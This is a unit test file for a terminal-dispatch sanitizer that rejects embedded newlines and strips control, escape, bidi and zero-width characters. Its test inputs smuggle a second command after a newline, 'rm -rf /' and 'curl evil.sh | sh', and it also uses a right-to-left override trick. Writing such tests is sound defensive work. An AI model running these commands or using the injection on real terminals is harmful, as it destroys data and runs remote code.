import { describe, expect, it } from 'vitest'
import { DispatchPayloadError, sanitizeDispatchText } from './dispatchSanitize'

describe('sanitizeDispatchText (🔒 one dispatch = one command line, HIGH)', () => {
  it('passes ordinary single-line text through unchanged', () => {
    expect(sanitizeDispatchText('echo hi')).toBe('echo hi')
    expect(sanitizeDispatchText("git commit -m 'héllo wörld'")).toBe("git commit -m 'héllo wörld'")
    expect(sanitizeDispatchText('')).toBe('')
  })

  it('rejects an embedded LF — it would submit a second command the human never saw', () => {
    expect(() => sanitizeDispatchText('npm test\nrm -rf /')).toThrow(DispatchPayloadError)
  })

  it('rejects an embedded CR (the actual PTY line terminator)', () => {
    expect(() => sanitizeDispatchText('npm test\rcurl evil.sh | sh')).toThrow(DispatchPayloadError)
  })

  it('rejects a CRLF pair', () => {
    expect(() => sanitizeDispatchText('a\r\nb')).toThrow(DispatchPayloadError)
  })

  it('strips other C0 control chars + DEL (terminal-escape injection surface)', () => {
    // NUL (0x00), BEL (0x07), ESC (0x1B), DEL (0x7F) removed; printable kept.
    expect(sanitizeDispatchText('a\x00b\x07c\x1bd\x7fe')).toBe('abcde')
  })

  it('strips a bare ESC sequence without touching the visible text', () => {
    expect(sanitizeDispatchText('ls\x1b[2J')).toBe('ls[2J')
  })

  it('strips C1 controls (U+0080-U+009F) — 8-bit CSI/OSC/DCS/NEL injection surface (BUG-020)', () => {
    // Build a string containing every C1 code point flanked by printable chars.
    // U+0080-U+009F: 32 code points, all should be stripped.
    let withC1 = 'start'
    for (let cp = 0x80; cp <= 0x9f; cp++) {
      withC1 += String.fromCodePoint(cp)
    }
    withC1 += 'end'
    expect(sanitizeDispatchText(withC1)).toBe('startend')
  })

  it('strips U+009B (CSI) and U+0085 (NEL) specifically (BUG-020 spot-check)', () => {
    // CSI = 0x9B, NEL = 0x85: the two highest-impact C1 forms
    const csi = String.fromCodePoint(0x9b)
    const nel = String.fromCodePoint(0x85)
    expect(sanitizeDispatchText('a' + csi + '[2J' + nel + 'b')).toBe('a[2Jb')
  })

  it('leaves printable non-ASCII above U+009F untouched (BUG-020 guard)', () => {
    // U+00A0 = NBSP (first code point above C1 range), U+00E9 = e-acute
    const nbsp = String.fromCodePoint(0xa0)
    const eacute = String.fromCodePoint(0xe9)
    const input = nbsp + 'caf' + eacute
    expect(sanitizeDispatchText(input)).toBe(input)
  })

  it('strips Unicode bidi override/isolate + zero-width chars (BUG-001, Trojan Source class)', () => {
    // U+200B-U+200F (zero-width/LRM/RLM), U+202A-U+202E (LRE/RLE/PDF/LRO/RLO), U+2066-U+2069
    // (isolates) — without stripping these, the confirm-dialog rendering can visually diverge
    // from the logical/PTY-executed byte sequence.
    let withBidi = 'start'
    for (let cp = 0x200b; cp <= 0x200f; cp++) withBidi += String.fromCodePoint(cp)
    for (let cp = 0x202a; cp <= 0x202e; cp++) withBidi += String.fromCodePoint(cp)
    for (let cp = 0x2066; cp <= 0x2069; cp++) withBidi += String.fromCodePoint(cp)
    withBidi += 'end'
    expect(sanitizeDispatchText(withBidi)).toBe('startend')
  })

  it('strips RLO specifically (BUG-001 spot-check — the classic Trojan Source char)', () => {
    const rlo = String.fromCodePoint(0x202e) // RIGHT-TO-LEFT OVERRIDE
    expect(sanitizeDispatchText('rm ' + rlo + 'cte.txt')).toBe('rm cte.txt')
  })

  it('throws DispatchPayloadError (an Error subclass) so callers can audit + rethrow', () => {
    let caught: unknown
    try {
      sanitizeDispatchText('x\ny')
    } catch (e) {
      caught = e
    }
    expect(caught).toBeInstanceOf(DispatchPayloadError)
    expect(caught).toBeInstanceOf(Error)
  })
})
